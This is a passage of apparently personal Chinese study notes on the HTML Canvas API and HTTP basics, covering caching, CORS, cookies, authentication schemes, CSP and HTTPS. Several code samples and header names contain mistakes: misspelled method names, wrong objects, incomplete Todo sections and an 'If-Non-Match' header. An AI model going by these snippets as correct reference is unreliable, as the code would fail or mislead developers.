<h2 id="矩形"><a href="#矩形" class="headerlink" title="矩形"></a>矩形</h2><p>rect(x, y, width, height)：创建矩形。<br>fillRect(x, y, width, height)：绘制”被填充”的矩形。<br>strokeRect(x, y, width, height)：绘制矩形（无填充）。<br>clearRect(x, y, width, height)：在给定的矩形内清除指定的像素。</p>
<h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>fill()：填充当前绘图（路径）。<br>stroke()：绘制已定义的路径。<br>beginPath()：起始一条路径，或重置当前路径。<br>moveTo()：把路径移动到画布中的指定点，不创建线条。<br>  x：路径的目标位置的 x 坐标。<br>  y：路径的目标位置的 y 坐标。<br>closePath()：创建从当前点回到起始点的路径。<br>lineTo()：添加一个新点，然后在画布中创建从该点到最后指定点的线条。<br>  x：路径的目标位置的 x 坐标。<br>  y：路径的目标位置的 y 坐标。<br>clip()：从原始画布剪切任意形状和尺寸的区域。<br>quadraticCurveTo()：创建二次贝塞尔曲线。<br>  cpx：贝塞尔控制点的 x 坐标。<br>  cpy：贝塞尔控制点的 y 坐标。<br>  x：结束点的 x 坐标。<br>  y：结束点的 y 坐标。<br>bezierCurveTo()：创建三次贝塞尔曲线。<br>  cp1x：第一个贝塞尔控制点的 x 坐标。<br>  cp1y：第一个贝塞尔控制点的 y 坐标。<br>  cp2x：第二个贝塞尔控制点的 x 坐标。<br>  cp2y：第二个贝塞尔控制点的 y 坐标。<br>  x：结束点的 x 坐标。<br>  y：结束点的 y 坐标。<br>arc()：创建弧&#x2F;曲线（用于创建圆形或部分圆）。<br>  x：圆的中心的 x 坐标。<br>  y：圆的中心的 y 坐标。<br>  r：圆的半径。<br>  sAngle：起始角，以弧度计（弧的圆形的三点钟位置是 0 度）。<br>  eAngle：结束角，以弧度计。<br>  counterclockwise：可选。规定应该逆时针还是顺时针绘图。False &#x3D; 顺时针，true &#x3D; 逆时针。<br>arcTo()：创建两切线之间的弧&#x2F;曲线。<br>  x1：两切线交点的横坐标。<br>  y1：两切线交点的纵坐标。<br>  x2：第二条切线上一点的横坐标。<br>  y2：第二条切线上一点的纵坐标。<br>  r：弧的半径。<br>isPointInPath()：如果指定的点位于当前路径中，则返回 true，否则返回 false。<br>  x：要测试的 x 坐标。<br>  y：要测试的 y 坐标。</p>
<h2 id="变换"><a href="#变换" class="headerlink" title="变换"></a>变换</h2><p>scale()：缩放当前绘图至更大或更小。<br>  scalewidth：缩放当前绘图的宽度（1&#x3D;100%，0.5&#x3D;50%，2&#x3D;200%，依次类推）。<br>  scaleheight：缩放当前绘图的高度（1&#x3D;100%，0.5&#x3D;50%，2&#x3D;200%，依次类推）。<br>rotate()：旋转当前绘图。<br>  angle：旋转角度，以弧度计。<br>translate()：重新映射画布上的 (0,0) 位置。<br>  x：添加到水平坐标（x）上的值。<br>  y：添加到垂直坐标（y）上的值。<br>transform()：替换绘图的当前转换矩阵。<br>  a：水平缩放绘图。<br>  b：水平倾斜绘图。<br>  c：垂直倾斜绘图。<br>  d：垂直缩放绘图。<br>  e：水平移动绘图。<br>  f：垂直移动绘图。<br>setTransform()：将当前转换重置为单位矩阵。然后运行 transform()。<br>  a：水平缩放绘图。<br>  b：水平倾斜绘图。<br>  c：垂直倾斜绘图。<br>  d：垂直缩放绘图。<br>  e：水平移动绘图。<br>  f：垂直移动绘图。</p>
<h2 id="文本"><a href="#文本" class="headerlink" title="文本"></a>文本</h2><p>font：设置或返回文本内容的当前字体属性。<br>textAlign：设置或返回文本内容的当前对齐方式。<br>  start：默认。文本在指定的位置开始。<br>  end：文本在指定的位置结束。<br>  center：文本的中心被放置在指定的位置。<br>  left：文本在指定的位置开始。<br>  right：文本在指定的位置结束。<br>textBaseline：设置或返回在绘制文本时使用的当前文本基线。<br>  alphabetic：默认。文本基线是普通的字母基线。<br>  top：文本基线是 em 方框的顶端。<br>  hanging：文本基线是悬挂基线。<br>  middle：文本基线是 em 方框的正中。<br>  ideographic：文本基线是表意基线。<br>  bottom：文本基线是 em 方框的底端。</p>
<p>fillText()：在画布上绘制”被填充的”文本。<br>  text：规定在画布上输出的文本。<br>  x：开始绘制文本的 x 坐标位置（相对于画布）。<br>  y：开始绘制文本的 y 坐标位置（相对于画布）。<br>  maxWidth：可选。允许的最大文本宽度，以像素计。<br>strokeText()：在画布上绘制文本（无填充）。<br>  text：规定在画布上输出的文本。<br>  x：开始绘制文本的 x 坐标位置（相对于画布）。<br>  y：开始绘制文本的 y 坐标位置（相对于画布）。<br>  maxWidth：可选。允许的最大文本宽度，以像素计。<br>measureText()：返回包含指定文本宽度的对象。<br>  text：要测量的文本。</p>
<p>font：<br>font-style：规定字体样式。可能的值：<br>  normal<br>  italic<br>  oblique<br>font-variant：规定字体变体。可能的值：<br>  normal<br>  small-caps<br>font-weight：规定字体的粗细。可能的值：<br>  normal<br>  bold<br>  bolder<br>  lighter<br>  100<br>  200<br>  300<br>  400<br>  500<br>  600<br>  700<br>  800<br>  900<br>font-size&#x2F;line-height：规定字号和行高，以像素计。<br>font-family：规定字体系列。<br>caption：使用标题控件的字体（比如按钮、下拉列表等）。<br>icon：使用用于标记图标的字体。<br>menu：使用用于菜单中的字体（下拉列表和菜单列表）。<br>message-box：使用用于对话框中的字体。<br>small-caption：使用用于标记小型控件的字体。<br>status-bar：使用用于窗口状态栏中的字体。</p>
<h2 id="图像绘制"><a href="#图像绘制" class="headerlink" title="图像绘制"></a>图像绘制</h2><p>drawImage(img, sx, sy, swidth, sheight, x, y, width, height)：图像，裁剪区域，放置区域。向画布上绘制图像、画布或视频。</p>
<h2 id="像素操作"><a href="#像素操作" class="headerlink" title="像素操作"></a>像素操作</h2><p>width：返回 ImageData 对象的宽度。<br>height：返回 ImageData 对象的高度。<br>data：返回一个对象，其包含指定的 ImageData 对象的图像数据。每个对象占数组的4个连续下标</p>
<p>createImageData(width, height, imageData)：创建新的、空白的 ImageData 对象。<br>getImageData(x, y, width, height)：返回 ImageData 对象，该对象为画布上指定的矩形复制像素数据。<br>putImageData(imgData, x, y, dirtyX, dirtyY, dirtyWidth, dirtyHeight)：把图像数据（从指定的 ImageData 对象）放回画布上。</p>
<h2 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h2><p>globalAlpha：透明值。必须介于 0.0（完全透明） 与 1.0（不透明） 之间。设置或返回绘图的当前 alpha 或透明值。<br>globalCompositeOperation：设置或返回新图像如何绘制到已有的图像上。</p>
<p>值：<br>source-over：默认。在目标图像上显示源图像。<br>source-atop：在目标图像顶部显示源图像。源图像位于目标图像之外的部分是不可见的。<br>source-in：在目标图像中显示源图像。只有目标图像之内的源图像部分会显示，目标图像是透明的。<br>source-out：在目标图像之外显示源图像。只有目标图像之外的源图像部分会显示，目标图像是透明的。<br>destination-over：在源图像上显示目标图像。<br>destination-atop：在源图像顶部显示目标图像。目标图像位于源图像之外的部分是不可见的。<br>destination-in：在源图像中显示目标图像。只有源图像之内的目标图像部分会被显示，源图像是透明的。<br>destination-out：在源图像之外显示目标图像。只有源图像之外的目标图像部分会被显示，源图像是透明的。<br>lighter：显示源图像 + 目标图像。<br>copy：显示源图像。忽略目标图像。<br>xor：使用异或操作对源图像与目标图像进行组合。</p>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>方法：</p>
<p>save()：保存当前环境的状态。<br>restore()：返回之前保存过的路径状态和属性。<br>createEvent()：创建事件<br>getContext()： 获取上下文<br>toDataURL()：转Base64编码</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>基础操作</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> context = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  canvas.<span class="property">width</span> = <span class="number">1152</span></span><br><span class="line">  canvas.<span class="property">height</span> = <span class="number">768</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>绘制一个红色矩形</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">canvas.<span class="title function_">fillStyle</span>(<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">canvas.<span class="title function_">fillRect</span>(<span class="number">100</span>, <span class="number">100</span>, <span class="number">400</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure>

<p>图像缩放</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> image = <span class="keyword">new</span> <span class="title class_">Image</span>()</span><br><span class="line">img.<span class="property">src</span> = <span class="string">&#x27;img.jpg&#x27;</span></span><br><span class="line"><span class="comment">// 当图像加载完成后开始绘制</span></span><br><span class="line">img.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 从(0, 0)绘制</span></span><br><span class="line">  context.<span class="title function_">drawImage</span>(image, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// 从(0, 0)绘制，图像缩放为(300, 500)</span></span><br><span class="line">  context.<span class="title function_">drawImage</span>(image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">300</span>, <span class="number">500</span>)</span><br><span class="line">  <span class="comment">// 将原图像映射到画布上(放大2倍)</span></span><br><span class="line">  context.<span class="title function_">drawImage</span>(image, <span class="number">0</span>, <span class="number">0</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">600</span>, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>图像加水印</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// drawImage 也可以传 canvas 参数</span></span><br><span class="line"><span class="keyword">let</span> waterMarkCanvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;water-mark-canvas&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> waterMarkContext = waterMarkCanvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line">waterMarkCanvas.<span class="property">width</span> = <span class="number">300</span></span><br><span class="line">waterMarkCanvas.<span class="property">height</span> = <span class="number">500</span></span><br><span class="line">waterMarkContext.<span class="property">fillStyle</span> = <span class="string">&quot;rgba(255,255,255,0.3)&quot;</span></span><br><span class="line">waterMarkContext.<span class="title function_">fillText</span>(<span class="string">&quot;abcd&quot;</span>, <span class="number">20</span>, <span class="number">50</span>)</span><br><span class="line">context.<span class="title function_">drawImage</span>(waterMarkCanvas, <span class="number">0</span>, <span class="number">0</span>, <span class="number">300</span>, <span class="number">500</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">50</span>)</span><br></pre></td></tr></table></figure>

<p>放大镜（离屏）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;off-canvas&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display: none&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> isMouseDown = <span class="literal">false</span></span><br><span class="line"><span class="keyword">let</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> context = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> offCanvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;off-canvas&#x27;</span>)</span><br><span class="line"><span class="keyword">let</span> offContext = canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">release</span> = (<span class="params">event</span>) =&gt; &#123;</span><br><span class="line">  event.<span class="title function_">preventDefualt</span>()</span><br><span class="line">  isMouseDown = <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="title function_">getTruePosition</span> = (<span class="params">event</span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> &#123; left, top &#125; = canvas.<span class="title function_">getBoundingClientRect</span>()</span><br><span class="line">  <span class="keyword">let</span> x = event.<span class="property">clientX</span> - left</span><br><span class="line">  <span class="keyword">let</span> y = event.<span class="property">clientY</span> - top</span><br><span class="line">  <span class="keyword">return</span> &#123;x, y&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">canvas.<span class="property">onmousedown</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 禁用默认事件</span></span><br><span class="line">  event.<span class="title function_">preventDefualt</span>()</span><br><span class="line">  <span class="comment">// 默认获取的是鼠标相对浏览器的坐标，需要转化为相对 canvas 的坐标</span></span><br><span class="line">  isMouseDown = <span class="literal">true</span></span><br><span class="line">  <span class="keyword">let</span> point = <span class="title function_">getTruePosition</span>(event)</span><br><span class="line">  <span class="comment">// Todo</span></span><br><span class="line">  <span class="comment">// 保存上下文</span></span><br><span class="line">  context.<span class="title function_">save</span>()</span><br><span class="line">  context.<span class="title function_">beginPath</span>()</span><br><span class="line">  context.<span class="title function_">arc</span>(point.<span class="property">x</span>, point.<span class="property">y</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="title class_">Math</span>.<span class="property">PI</span> * <span class="number">2</span>)</span><br><span class="line">  <span class="comment">// clip 后只能在区域内绘制</span></span><br><span class="line">  context.<span class="title function_">clip</span>()</span><br><span class="line">  context.<span class="title function_">drawImage</span>(offCanvas, ...)</span><br><span class="line">  <span class="comment">// 恢复上下文</span></span><br><span class="line">  context.<span class="title function_">restore</span>()</span><br><span class="line">&#125;</span><br><span class="line">canvas.<span class="property">onmousemove</span> = <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">preventDefualt</span>()</span><br><span class="line">  <span class="keyword">if</span>(!isMouseDown) <span class="keyword">return</span></span><br><span class="line">  <span class="comment">// Todo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">canvas.<span class="property">onmouseup</span> = release</span><br><span class="line">canvas.<span class="property">onmouseout</span> = release</span><br></pre></td></tr></table></figure>

<p>滤镜</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取图像的区域像素</span></span><br><span class="line"><span class="keyword">let</span> imageData = context.<span class="title function_">getImageData</span>(x, y, w, h)</span><br><span class="line"><span class="comment">// 应用图像的区域像素</span></span><br><span class="line"><span class="keyword">let</span> imageData = context.<span class="title function_">putImageData</span>(imageData, dx, dy, dirtyX, dirtyY, dirtyW, dirtyH)</span><br><span class="line"><span class="comment">// 创建ImageData</span></span><br><span class="line"><span class="keyword">let</span> imageData = context.<span class="title function_">createImageData</span>(w, h)</span><br><span class="line"><span class="comment">// Todo</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP</title>
    <url>/2021/08/21/%E5%89%8D%E7%AB%AF/HTTP/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>参考网站：<a href="https://developer.mozilla.org/zh-CN/docs/Learn">MDN</a></p>
<p>一个完整的HTTP请求：</p>
<ul>
<li>Redirect - 根据本地缓存判断，是否永久跳转到新的URL</li>
<li>App cache - 查询资源缓存</li>
<li>DNS - DNS 解析域名</li>
<li>TCP - 创建TCP，SSL</li>
<li>Request - 请求</li>
<li>Response - 响应</li>
</ul>
<h1 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h1><ul>
<li>1.1 <ul>
<li>持久TCP连接</li>
<li>Pipeline 多个请求放入一个Pipeline依次处理</li>
<li>Host等命令，区分服务器上的不同web服务</li>
</ul>
</li>
<li>2<ul>
<li>所有数据以二进制传输</li>
<li>多个请求不再按照顺序处理</li>
<li>头信息压缩</li>
<li>服务器主动推送</li>
</ul>
</li>
</ul>
<p>如果客户端想要升级协议，例如：<code>HTTP/2, WebSocket</code>，可以配置头部：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.example.com</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>example/1, foo/2</span><br></pre></td></tr></table></figure>

<h1 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h1><p>HTTP 资源</p>
<ul>
<li>URI - 包含 URL 和 URN - 统一资源标识符</li>
<li>URL - 统一资源定位符<ul>
<li>protocol:&#x2F;&#x2F;user:password@hostname:port&#x2F;path?query&#x3D;string#hash</li>
</ul>
</li>
<li>URN - 永久统一资源定位符 - 目前还没有成熟方案</li>
</ul>
<p>URL 模式</p>
<ul>
<li>普通模式 - 使用<code>?</code>携带参数，<code>/app?id=1&amp;name=xyz</code></li>
<li>PATHINFO - 使用<code>/</code>, <code>-</code>携带参数<ul>
<li><code>/index.php/module/action/var</code></li>
<li><code>/index.php/module-action-var</code></li>
</ul>
</li>
<li>REWRITE - 在PATHINFO基础上增加了重写规则，可以去掉<code>index.php</code></li>
<li>兼容模式 - 用于不支持PATHINFO的情况，<code>/index.php/?s=/module/action/var</code></li>
</ul>
<p>Data URL：允许向文档中嵌入小文件，其格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</span><br><span class="line">data:text/plain;base64,SGVsbG8sIFdvcmxkIQ%3D%3D</span><br></pre></td></tr></table></figure>

<p><a href="https://www.iana.org/assignments/media-types/media-types.xhtml">MIME 类型</a>：用于描述文件类型。</p>
<ul>
<li>text &#x2F; plain, html, css, javascript - 文本</li>
<li>image &#x2F; gif, png, jpg, bmp, x-icon … - 图片</li>
<li>application &#x2F; xml, pdf, javascript, x-www-form-urlencoded, json - 二进制文件</li>
<li>multipart &#x2F; form-data, byteranges - 复合文件格式，<ul>
<li>例：<code>byteranges</code>可以配合<code>206</code>来发送文件的一部分</li>
</ul>
</li>
<li>audio &#x2F; midi, mpeg, ogg, wav</li>
<li>video &#x2F; webm, ogg</li>
<li>font</li>
<li>message</li>
<li>example</li>
<li>model</li>
</ul>
<h1 id="HTTP客户端-CURL"><a href="#HTTP客户端-CURL" class="headerlink" title="HTTP客户端 CURL"></a>HTTP客户端 CURL</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 一次访问</span></span><br><span class="line">curl baidu.com</span><br><span class="line"><span class="comment"># 一次访问 带头部</span></span><br><span class="line">curl -v www.baidu.com</span><br></pre></td></tr></table></figure>

<p>客户端由<code>user-agent</code>描述。</p>
<h1 id="CORS-跨域"><a href="#CORS-跨域" class="headerlink" title="CORS 跨域"></a>CORS 跨域</h1><ul>
<li>请求会接受，响应也会发送，但是会被浏览器拦截响应</li>
<li>不受跨域限制的有link, script, img等标签</li>
<li>默认只允许<ul>
<li>方法：GET, HEAD, POST</li>
<li>Content-Type: text&#x2F;plain, multipart&#x2F;form-data, application&#x2F;x-www-form-urlencoded</li>
<li>请求头：Accept, Accept-Language, Content-Language, Content-Type</li>
<li>XMLHttpRequestUpload 对象，均没有注册任何事件监听器</li>
<li>没有ReadableStream对象</li>
</ul>
</li>
<li>预请求验证<ul>
<li>先发送一个OPTIONS请求，再发送真正的请求</li>
</ul>
</li>
<li>服务器端的Response需要添加头部<ul>
<li>‘Access-Control-Allow-Origin’: ‘*’</li>
</ul>
</li>
<li>添加允许的请求头<ul>
<li>‘Access-Control-Allow-Headers’: ‘X-Test-Cors’</li>
</ul>
</li>
<li>添加允许的方法<ul>
<li>‘Access-Control-Allow-Methods’: ‘POST, PUT, DELETE’</li>
</ul>
</li>
<li>1000秒内不用再发预请求<ul>
<li>‘Access-Control-Max-Age’: ‘1000’</li>
</ul>
</li>
</ul>
<h1 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h1><ul>
<li>Cache-Control 字段：客户端的缓存</li>
<li>可缓存性：public, private, no-cache<ul>
<li>public - 请求经过的所有节点都可以缓存</li>
<li>private - 只有发起请求的浏览器可以缓存</li>
<li>no-cache - 缓存，但是每次去服务器验证一次</li>
</ul>
</li>
<li>到期<ul>
<li>max-age &#x3D; 秒数 - 浏览器使用</li>
<li>s-maxage &#x3D; 秒数 - 代理服务器使用</li>
<li>max-stale &#x3D; 秒数 - 即便缓存过期，但是没超过这个时间，缓存仍然可以用</li>
</ul>
</li>
<li>重新验证<ul>
<li>must-revalidate - 如果已经过期，则必须到原服务端验证缓存</li>
<li>proxy-revalidate - 代理服务去原服务器验证缓存</li>
</ul>
</li>
<li>其他<ul>
<li>no-store - 不缓存，每次去服务器拿新数据</li>
<li>no-transform - 代理服务器不对数据做改动（压缩等）</li>
</ul>
</li>
<li>如果想要每次更新后重新请求缓存，可以通过修改资源名，使用hash名称。</li>
<li>资源验证<ul>
<li>Code：304 - 所请求的资源未修改，允许客户端使用缓存</li>
<li>验证头<ul>
<li>Last-Modified - ‘123’ - 对比时间，过期则请求缓存<ul>
<li>If-Modified-Since - 客户端下次请求，就会拿出这些头</li>
<li>If-Unmodified-Since -</li>
</ul>
</li>
<li>Etag - ‘789’ - 通过数据签名验证，每个数据签名唯一，只要修改就变<ul>
<li>If-Match - 客户端下次请求，就会拿出这些头</li>
<li>If-Non-Match</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Etag </span></span><br><span class="line"><span class="keyword">if</span>(req.<span class="property">headers</span>[<span class="string">&#x27;if-non-match&#x27;</span>] === <span class="string">&#x27;789&#x27;</span>) &#123;</span><br><span class="line">  resp.<span class="title function_">writeHead</span>(<span class="number">304</span>, &#123;<span class="comment">/* Headers */</span>&#125;)</span><br><span class="line">  resp.<span class="title function_">end</span>(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  resp.<span class="title function_">end</span>(<span class="string">&#x27;true content&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><ul>
<li>Set-Cookie - 服务器设置，之后客户端每次访问都会带着，可以有多个这个头，不可跨域访问<ul>
<li>max-age - 有效时间，默认关闭浏览器后清除</li>
<li>expires - 到期时间</li>
<li>Secure</li>
<li>HttpOnly - 禁止<code>Javascript</code>访问</li>
<li>domain - 允许设置的域名，可以解决跨域不能访问的问题</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cookie</span></span><br><span class="line">resp.<span class="title function_">writeHead</span>(<span class="number">200</span>, &#123;</span><br><span class="line">  <span class="string">&#x27;Set-Cookie&#x27;</span>: [<span class="string">&#x27;id=123; max-age=2&#x27;</span>, <span class="string">&#x27;abc=456&#x27;</span>]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>但是由于传输Cookie会带来额外开销，因此浏览器又提供了新的数据存储方法。</p>
<ul>
<li>sessionStorage - 为每个页面开辟的独立存储区域，浏览器关闭后释放。大小一般为10MB。</li>
<li>localStorage - 功能相同，关闭浏览器也不会消失。大小一般为10MB。</li>
<li>IndexedDB - 基于 JavaScript 的非关系数据库，大小可达2GB。可以用于WebGL开发。</li>
</ul>
<h1 id="身份验证"><a href="#身份验证" class="headerlink" title="身份验证"></a>身份验证</h1><p>当客户端未授权访问一个页面时，服务器会返回<code>401 unauthorized</code>响应，并附带<code>WWW-Authenticate</code>头部对客户端进行质询，该头部包含了几种允许的质询的方式。之后客户端就会在<code>Authorization</code>头部写入身份凭证信息。</p>
<p>代理服务器也可以对客户端进行身份验证，使用的是<code>407</code>响应，并附带<code>Proxy-Authorization</code>头部。之后客户端就会在<code>Proxy-Authorization</code>头部写入身份凭证信息。</p>
<p>验证方案有如下集中：</p>
<ul>
<li>Basic 基本认证，base64编码用户名和密码（即用户凭证）<ul>
<li>Authorization: Basic base64(user:password)</li>
</ul>
</li>
<li>Digest 摘要认证，采用质询与响应方法<ul>
<li>Authorization-Required</li>
<li>WWW-Authenticate： Digest realm&#x3D;”DIGEST” …(质询码，加密算法，等)</li>
<li>Authorization: Digest username&#x3D;”user” realm&#x3D;”DIGEST” response&#x3D;”xxx” …(质询码，加密算法，等)</li>
</ul>
</li>
<li>SSL 客户端认证：利用HTTPS</li>
<li>FormBase 表单认证：利用Cookie和Session</li>
<li>Bearer 通过OAuth 2.0保护资源</li>
<li>HOBA</li>
<li>Mutual</li>
<li>AWS4-HMAC-SHA256</li>
</ul>
<h1 id="长连接"><a href="#长连接" class="headerlink" title="长连接"></a>长连接</h1><ul>
<li>并发限制：默认是6个连接，多了会等待</li>
<li>Connection <ul>
<li>keep-alive - 保持长连接</li>
<li>close - 关闭长连接</li>
</ul>
</li>
</ul>
<h1 id="数据协商"><a href="#数据协商" class="headerlink" title="数据协商"></a>数据协商</h1><ul>
<li>客户端要求的数据格式，服务器返回的格式</li>
<li>请求<ul>
<li>Accept</li>
<li>Accept-Encoding - 编码方式</li>
<li>Accept-Language - 语言</li>
<li>User-Agent - 浏览器信息</li>
</ul>
</li>
<li>响应<ul>
<li>Content-Type - 对应 Accept 里的一种格式，使用<code>MIME Type</code><ul>
<li>application&#x2F;x-www-form-urlencoded</li>
<li>multipart&#x2F;form-data - 上传文件使用，需要加boundry，不同部分可以是不同的Content-Type</li>
<li>text&#x2F;plain</li>
</ul>
</li>
<li>X-Content-Type-Options - nosniff - 禁止客户端预测返回内容</li>
<li>Content-Encoding - 数据压缩<ul>
<li>gzip</li>
</ul>
</li>
<li>Content-Language</li>
</ul>
</li>
<li>断点续传<ul>
<li>Range - 请求头中，指示第一个字节和最后一个字节的位置<ul>
<li>0-1024, 3000-3999, 8000-</li>
</ul>
</li>
<li>Content-Range - (200, 206) 响应头，表示返回的实际内容<ul>
<li>bytes 0-1024 &#x2F; <code>[总长度]</code></li>
</ul>
</li>
<li>Content-Length - 响应头，表示返回的实际长度</li>
</ul>
</li>
</ul>
<h1 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h1><ul>
<li>响应 Code: <ul>
<li>301 - 永久跳转，下次跳转不会经过服务器，慎用</li>
<li>302 - 临时跳转</li>
</ul>
</li>
<li>Location - 新的 URL<ul>
<li>如果不是同一个域，就需要加上hostname和端口</li>
</ul>
</li>
</ul>
<h1 id="内容安全策略-CSP"><a href="#内容安全策略-CSP" class="headerlink" title="内容安全策略  CSP"></a>内容安全策略  CSP</h1><ul>
<li>用于限制资源获取，报告资源获取越权</li>
<li>资源类型限制<ul>
<li>default-src - 全局限制</li>
<li>connect-src - 请求源限制</li>
<li>img-src, font-src, frame-src, media-src, style-src, script-src, manifest-src - 可以被哪个网址加载</li>
</ul>
</li>
<li>Content-Security-Policy：<ul>
<li>default-src http: https:<ul>
<li>禁用 inline script</li>
</ul>
</li>
<li>default-src ‘self’<ul>
<li>禁用 外链资源，只能加载本站资源</li>
</ul>
</li>
<li>default-src ‘self’ ‘<a href="http://www.baidu.com/">http://www.baidu.com/</a>‘<ul>
<li>只允许 本站和百度的资源</li>
</ul>
</li>
<li>form-action ‘self’<ul>
<li>只允许 表单提交到本站</li>
</ul>
</li>
<li>report-uri &#x2F;report<ul>
<li>问题报告到这个连接</li>
</ul>
</li>
</ul>
</li>
<li>Content-Security-Policy-Report-Only - 检测到，但是不拦截，只报告</li>
</ul>
<p>也可以写到htle的meta标签中。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">ccontent</span>=<span class="string">&quot;script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h1><p>客户端向服务端发送请求，服务器返回一个公钥，客户端使用公钥加密数据再次发给服务器，服务器利用私钥解密数据。</p>
<p>此外，CA会向服务器颁发证书，证书中包含：服务器公钥（CA用私钥加密），签名（CA用私钥加密）等。之后服务器只向客户端发送证书，证书的合法性由客户端自己去求证。</p>
<p>TLS&#x2F;SSL协议：</p>
<ul>
<li>SSL 3.0 - 存在安全漏洞</li>
<li>TLS 1.0 - 存在安全漏洞</li>
<li>TLS 1.1</li>
<li>TLS 1.2</li>
<li>TLS 1.3</li>
</ul>
<p>使用HTTPS需要证书，以及对于证书的加解密配置。证书可以让CA签发，也可以自己生成。</p>
<p>生成一个证书</p>
